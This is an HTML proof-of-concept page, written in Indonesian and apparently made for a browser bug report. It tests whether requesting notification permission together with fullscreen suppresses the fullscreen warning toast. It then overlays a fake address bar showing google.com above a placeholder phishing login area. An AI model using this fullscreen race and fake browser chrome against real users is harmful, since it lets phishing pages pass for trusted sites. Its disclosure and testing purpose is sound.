@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Fullscreen Toast vs Permission Prompt</title>
+<style>
+  body { font-family:'Segoe UI',sans-serif; padding:40px; background:#f0f4ff; max-width:840px; }
+  .warn { background:#fff3cd; border:1px solid #ffe69c; border-radius:6px; padding:10px 14px; font-size:13px; margin-bottom:14px; }
+  .card { background:#fff; border:1px solid #d0d8e8; border-radius:8px; padding:14px; margin-bottom:12px; }
+  button { padding:11px 16px; background:#0078d4; color:#fff; border:none; border-radius:6px;
+           font-size:14px; cursor:pointer; margin-top:8px; margin-right:8px; }
+  .hit { color:#b00020; font-weight:bold; }
+  #log { font-size:13px; background:#fff; padding:14px; border-radius:6px; white-space:pre-wrap; min-height:60px; }
+  #fakebar { display:none; position:fixed; left:0; top:0; z-index:2147483647; width:100vw; }
+  #phish { display:none; padding:60px 20px; text-align:center; font-size:22px; }
+</style>
+</head>
+<body>
+<h3>Tes: Notifikasi Fullscreen vs Dialog Permission (temuan fs-c)</h3>
+<div class="warn">
+<b>Hipotesis:</b> saat <code>requestFullscreen()</code> dan <code>Notification.requestPermission()</code>
+dijalankan di klik yang sama, notifikasi <b>"Press Esc to exit fullscreen"</b> tidak tampil / ketutup
+dialog izin → user masuk fullscreen TANPA peringatan → digabung fake address bar = phishing chrome palsu
+komplit.<br>
+<b>Preseden:</b> P1 #40057591 (permission dialog sembunyiin fullscreen alert), P1 #40068607 (Hide
+Fullscreen Notification), P1 #40064688 (autofill+fullscreen), P1 #40063918 (PiP), P2 #390571618
+(permission dialog dismiss menipu status fullscreen).<br>
+<b>Bedain:</b> "Esc tetap bisa keluar" = BUKAN ukuran (itu selalu jalan). Yang diuji = <b>toast
+peringatannya muncul & keliatan atau nggak</b>. Rekam video LAYAR PENUH.
+</div>
+
+<div class="card">
+<b>Langkah 1 — KONTROL (wajib dulu): fullscreen saja</b><br>
+<span style="font-size:13px">Klik → layar fullscreen → <b>harusnya muncul toast</b> "Press Esc to exit
+fullscreen" (sekitar 1-4 detik, biasanya atas/tengah). Catat: <b>muncul? posisi mana? berapa lama?</b>
+<span class="hit">Kalau kontrol aja gak ada toast → test INVALID (perilaku default beda), jangan dilanjut.</span></span><br>
+<button onclick="tKontrol()">Kontrol: fullscreen saja</button>
+</div>
+
+<div class="card">
+<b>Langkah 2 — RACE: fullscreen + dialog izin notifikasi barengan</b><br>
+<span style="font-size:13px">Klik → fullscreen masuk DAN dialog "izinkan notifikasi" muncul bersamaan →
+resolve dialog (Allow/Block) → perhatikan: <b>toast peringatan fullscreen pernah keliatan gak</b> selama
+situasi itu?<br>
+<span class="hit">HIT:</span> toast TIDAK PERNAH terlihat di video (padahal kontrol ada) ATAU habis
+masa-tampilnya tertutup penuh dialog → lapor P1/P2 kelas 40057591.<br>
+<span>BUKAN BUG: toast tetap kelihatan (meski sebentar / sebagian).</span></span><br>
+<button onclick="tRace()">Race: fullscreen + prompt izin</button>
+</div>
+
+<div class="card">
+<b>Langkah 3 — CHAIN penuh (cuma kalau Langkah 2 = HIT): fake address bar</b><br>
+<span style="font-size:13px">Rekaan dari fs-c: setelah dialog resolve, gambar chrome browser palsu
+(tab + <code>google.com</code>) disisip di atas → konten bawah = halaman phishing. Ini buat VIDEO
+demonstrasi dampaknya, bukan bukti terpisah. Untuk laporan nanti ganti domain jelas palsu
+(mis. <code>acc0unts.google.com.verify-domain.xyz</code>), jangan <code>google.com</code> beneran.</span><br>
+<button onclick="tChain()">Chain: fullscreen + prompt + fake bar</button>
+</div>
+
+<pre id="log"></pre>
+
+<script>
+function log(m){ var el=document.getElementById('log'); el.textContent += m+'\n'; el.scrollTop=el.scrollHeight; }
+window.onerror=function(msg,src,line){ log('JS ERROR: '+msg+' (baris '+line+')'); };
+
+async function tKontrol(){
+  log('KONTROL: fullscreen saja — perhatikan toast peringatan muncul gak & di mana');
+  try{ if(!document.fullscreenElement) await document.documentElement.requestFullscreen(); log('fullscreen aktif'); }
+  catch(e){ log('fullscreen gagal: '+e.message); }
+}
+
+async function tRace(){
+  log('RACE: fullscreen + Notification.requestPermission di klik yang sama');
+  try{ if(!document.fullscreenElement) await document.documentElement.requestFullscreen(); }
+  catch(e){ log('fullscreen gagal: '+e.message); }
+  try{
+    var r = await Notification.requestPermission();
+    log('izin notifikasi: '+r+' → SEKARANG cek: toast fullscreen pernah keliatan gak?');
+  }catch(e){ log('requestPermission err: '+e.message); }
+  log('Catat: (a) toast muncul SEBELUM dialog? (b) selama dialog kebuka? (c) SESUDAH dialog resolve?');
+}
+
+async function tChain(){
+  log('CHAIN: fullscreen + prompt → setelah resolve, fake bar masuk');
+  try{ if(!document.fullscreenElement) await document.documentElement.requestFullscreen(); }
+  catch(e){ log('fullscreen gagal: '+e.message); }
+  try{ var r = await Notification.requestPermission(); log('izin: '+r); }catch(e){ log('err: '+e.message); }
+  var img = document.createElement('img');
+  img.id='fakebar';
+  img.alt='fake browser chrome';
+  img.src='fake-chrome-bar.png'; // chrome palsu tab Google + google.com (dari fs-c)
+  document.body.appendChild(img);
+  img.style.display='block';
+  document.getElementById('phish').style.display='block';
+  log('fake bar dipasang → kalau toast gak pernah muncul = video demonstrasi siap');
+}
+
+log('Siap. Urutan: KONTROL → RACE → (CHAIN kalau HIT). Video layar penuh, tanpa jeda.');
+</script>
+<div id="phish"><b> Halaman login palsu (area phishing) — ganti konten asli saat demonstrasi</b></div>
+</body>
+</html>
